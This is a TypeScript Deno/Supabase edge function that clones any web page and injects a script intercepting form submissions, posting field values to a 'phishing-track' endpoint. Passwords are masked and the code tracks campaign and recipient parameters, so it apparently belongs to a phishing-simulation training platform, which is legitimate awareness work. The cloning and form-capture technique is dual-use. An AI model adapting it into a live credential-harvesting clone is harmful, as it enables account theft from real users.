import { serve } from "https://deno.land/std@0.177.0/http/server.ts";

const corsHeaders = {
  "Content-Type": "application/json",
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
};

const SUPABASE_URL = Deno.env.get("SUPABASE_URL") ?? "";

// Analytics/tracking domains to strip (scripts from these serve no UI purpose)
const STRIP_DOMAINS = [
  "google-analytics.com", "googletagmanager.com", "googlesyndication.com",
  "facebook.net", "facebook.com/tr", "connect.facebook.net",
  "hotjar.com", "clarity.ms", "mouseflow.com", "fullstory.com",
  "mixpanel.com", "segment.com", "amplitude.com",
  "doubleclick.net", "adnxs.com", "adsrvr.org",
  "zendesk.com/embeddable_framework", "intercomcdn.com",
];

// Known SPA/framework bundles — keep these so client-side rendering works
const KEEP_PATTERNS = [
  /react[\.\-]/, /vue[\.\-]/, /angular[\.\-]/, /ember[\.\-]/,
  /bootstrap/, /jquery/, /lodash/, /moment/, /axios/,
  /unpkg\.com/, /cdnjs\.cloudflare\.com/, /cdn\.jsdelivr\.net/,
  /stackpath\.bootstrapcdn\.com/,
];

function shouldStripScript(src: string): boolean {
  const lower = src.toLowerCase();
  // Always keep known framework/library scripts
  if (KEEP_PATTERNS.some(p => p.test(lower))) return false;
  // Strip analytics/tracking scripts
  if (STRIP_DOMAINS.some(d => lower.includes(d))) return true;
  // Strip service worker registration scripts (inline pattern handled separately)
  if (lower.includes("service-worker") || lower.includes("sw.js") || lower.includes("workbox")) return true;
  return false;
}

// Resolve a potentially relative URL to absolute
function resolveUrl(href: string, base: string): string {
  if (!href || href.startsWith("data:") || href.startsWith("blob:") || href.startsWith("#") || href.startsWith("javascript:")) {
    return href;
  }
  try {
    return new URL(href, base).toString();
  } catch {
    return href;
  }
}

// Fetch a resource with a short timeout, return null on failure
async function fetchResource(url: string, timeout = 8000): Promise<Response | null> {
  try {
    const res = await fetch(url, {
      headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36" },
      signal: AbortSignal.timeout(timeout),
    });
    if (!res.ok) return null;
    return res;
  } catch {
    return null;
  }
}

// Inline external CSS stylesheets (up to 50 KB each, max 5 sheets)
async function inlineStylesheets(html: string, baseUrl: string): Promise<string> {
  const linkPattern = /<link\b[^>]*\brel=["']?stylesheet["']?[^>]*\bhref=["']([^"']+)["'][^>]*\/?>/gi;
  const toInline: Array<{ tag: string; href: string }> = [];

  let m: RegExpExecArray | null;
  while ((m = linkPattern.exec(html)) !== null) {
    toInline.push({ tag: m[0], href: resolveUrl(m[1], baseUrl) });
    if (toInline.length >= 5) break;
  }

  let result = html;
  for (const { tag, href } of toInline) {
    if (!href.startsWith("http")) continue;
    const res = await fetchResource(href, 6000);
    if (!res) continue;
    const css = await res.text();
    if (css.length > 100_000) continue; // skip huge sheets
    // Rewrite url() in CSS to absolute
    const fixedCss = css.replace(/url\(['"]?([^'")]+)['"]?\)/g, (_, u) => {
      const abs = resolveUrl(u, href);
      return `url("${abs}")`;
    });
    result = result.replace(tag, `<style>${fixedCss}</style>`);
  }
  return result;
}

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") return new Response(null, { status: 204, headers: corsHeaders });

  try {
    const { url } = await req.json();
    if (!url) throw new Error("URL is required");

    const targetUrl = new URL(url);
    const pageBaseUrl = `${targetUrl.protocol}//${targetUrl.host}${targetUrl.pathname}`;

    const res = await fetchResource(url, 20000);
    if (!res) throw new Error(`Failed to fetch the page — the server may be blocking automated requests or the URL is unreachable.`);

    let html = await res.text();

    // Detect SPA (empty body with script bundles)
    const bodyContent = html.replace(/<script[\s\S]*?<\/script>/gi, '').replace(/<style[\s\S]*?<\/style>/gi, '');
    const isSpa = /<div\s+id=["']app["']/i.test(bodyContent) || /<div\s+id=["']root["']/i.test(bodyContent) || /<div\s+id=["']main["']/i.test(bodyContent);

    // ── 1. Rewrite all resource URLs to absolute ──
    // href / src / action / data-src
    html = html.replace(/\b(href|src|action|data-src|data-lazy-src)=(["'])([^"']*?)\2/gi, (match, attr, q, val) => {
      const abs = resolveUrl(val, pageBaseUrl);
      return `${attr}=${q}${abs}${q}`;
    });
    // CSS background-image url()
    html = html.replace(/url\((['"]?)([^'")\s]+)\1\)/g, (match, q, val) => {
      const abs = resolveUrl(val, pageBaseUrl);
      return `url(${q}${abs}${q})`;
    });
    // srcset attribute
    html = html.replace(/srcset=(["'])([^"']+)\1/gi, (match, q, srcset) => {
      const resolved = srcset.split(',').map((part: string) => {
        const [u, ...rest] = part.trim().split(/\s+/);
        return [resolveUrl(u, pageBaseUrl), ...rest].join(' ');
      }).join(', ');
      return `srcset=${q}${resolved}${q}`;
    });

    // ── 2. Add <base> tag if not present (fallback for any missed URLs) ──
    if (!/<base\b/i.test(html)) {
      const baseTag = `<base href="${targetUrl.protocol}//${targetUrl.host}/">`;
      html = html.includes('<head>')
        ? html.replace('<head>', `<head>\n  ${baseTag}`)
        : `<head>${baseTag}</head>\n` + html;
    }

    // ── 3. Remove service workers and analytics; keep framework scripts ──
    html = html.replace(/<script\b([^>]*)src=(["'])([^"']+)\2([^>]*)><\/script>/gi, (match, pre, q, src, post) => {
      if (shouldStripScript(src)) return '';
      return match; // keep
    });

    // Remove inline service-worker registration code
    html = html.replace(/<script\b[^>]*>([\s\S]*?)<\/script>/gi, (match, code) => {
      if (/serviceWorker\.register|navigator\.serviceWorker/i.test(code)) return '';
      return match;
    });

    // ── 4. Inline small external stylesheets ──
    try {
      html = await inlineStylesheets(html, pageBaseUrl);
    } catch { /* non-fatal */ }

    // ── 5. Inject credential-capture + phishing-track submit handler ──
    const trackingScript = `
<script>
(function(){
  // Prevent full-page navigations triggered by SPA routers
  var _push = history.pushState.bind(history);
  history.pushState = function(){ return _push.apply(history, arguments); };

  function attachForms() {
    document.querySelectorAll('form').forEach(function(form) {
      if (form.__aw_hooked) return;
      form.__aw_hooked = true;
      form.addEventListener('submit', function(e) {
        e.preventDefault();
        var data = {};
        form.querySelectorAll('input, select, textarea').forEach(function(inp) {
          if (inp.name) data[inp.name] = inp.type === 'password' ? '***' : inp.value;
        });
        var params = new URLSearchParams(window.location.search);
        var c = params.get('c') || '';
        var r = params.get('r') || '';
        if (c && r) {
          fetch('${SUPABASE_URL}/functions/v1/phishing-track?t=submit&c='+c+'&r='+r, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(data)
          }).catch(function(){});
        }
        setTimeout(function(){
          window.location.href = params.get('redirect') || 'https://www.google.com';
        }, 600);
      });
    });
  }

  // Attach immediately and watch for SPA-rendered forms
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', attachForms);
  } else {
    attachForms();
  }
  // MutationObserver for dynamically-rendered forms (React/Vue/Angular)
  var observer = new MutationObserver(function(){ attachForms(); });
  observer.observe(document.body || document.documentElement, { childList: true, subtree: true });
})();
</script>`;

    if (html.includes("</body>")) {
      html = html.replace("</body>", trackingScript + "</body>");
    } else {
      html += trackingScript;
    }

    const formDetected = /<form/i.test(html);
    const hasPasswordField = /type=["']?password["']?/i.test(html);
    const hasEmailField = /type=["']?email["']?/i.test(html) || /name=["']?email["']?/i.test(html);

    return new Response(JSON.stringify({
      html,
      source_url: url,
      form_detected: formDetected,
      has_password_field: hasPasswordField,
      has_email_field: hasEmailField,
      is_spa: isSpa,
      note: isSpa ? "SPA detected — framework scripts preserved for client-side rendering. Test the preview carefully." : null,
    }), { status: 200, headers: corsHeaders });

  } catch (err) {
    return new Response(JSON.stringify({ error: err instanceof Error ? err.message : "Clone failed" }), {
      status: 500,
      headers: corsHeaders,
    });
  }
});
